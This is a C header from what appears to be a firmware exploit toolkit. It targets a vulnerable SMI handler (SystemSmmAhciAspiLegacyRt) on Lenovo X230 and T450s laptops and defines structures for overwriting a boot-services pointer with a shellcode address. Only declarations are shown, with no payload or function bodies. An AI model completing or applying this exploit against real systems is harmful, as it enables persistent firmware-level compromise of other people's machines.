
#define UEFI_EXPL_LENOVO_TARGET_X230     0
#define UEFI_EXPL_LENOVO_TARGET_T450s    1

typedef struct _UEFI_EXPL_TARGET
{
    /*
        Target address to overwrite (EFI_BOOT_SERVICES->LocateService field value)
        with shellcode address.
    */
    unsigned long long addr;

    /*
        Number of vulnerable SMI handler.
    */
    int smi_num;

    /*
        Target name and description.
    */
    const char *name;

} UEFI_EXPL_TARGET,
*PUEFI_EXPL_TARGET;

bool expl_lenovo_SystemSmmAhciAspiLegacyRt_init(PUEFI_EXPL_TARGET target, int target_num);

bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
    PUEFI_EXPL_TARGET target,
    UEFI_EXPL_SMM_HANDLER handler, void *context,
    bool quiet
);

void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void);
